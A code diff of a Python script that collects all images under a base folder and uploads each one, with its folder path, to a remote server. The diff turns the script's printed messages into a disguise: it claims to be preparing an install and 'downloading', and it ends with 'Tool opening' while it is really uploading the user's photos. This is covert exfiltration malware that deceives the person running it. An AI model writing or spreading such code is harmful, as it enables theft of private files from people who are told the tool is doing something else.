@@ -24,19 +24,25 @@ def upload_image(image_path):
             data = {'path': relative_path}  # Send relative path to server
             response = requests.post(server_url, files=files, data=data)
             if response.status_code == 200:
-                print(f"[✔] Downloaded ...")
+                return True
             else:
-                print(f"[✘] Failed:")
+                return False
     except Exception as e:
-        print(f"[!] Error Downloading ... ")
+        return False
 
 # ✅ Step 4: Run Everything
 if __name__ == "__main__":
     print("🔍 Preparing for install...")
     images = find_all_images(base_path)
+    total_images = len(images)
     print(f"📤 Downloading started. Please wait, it may take several minutes...\n")
 
-    for img in images:
-        upload_image(img)
+    for idx, img in enumerate(images, start=1):
+        success = upload_image(img)
+        percent = int((idx / total_images) * 100)
+        if success:
+            print(f"✔ Downloading ({percent}%)")
+        else:
+            print(f" ... ")
 
-    print("\n✅ All done! Images uploaded with folder structure.")
+    print("\n✅ All done! Tool opening")
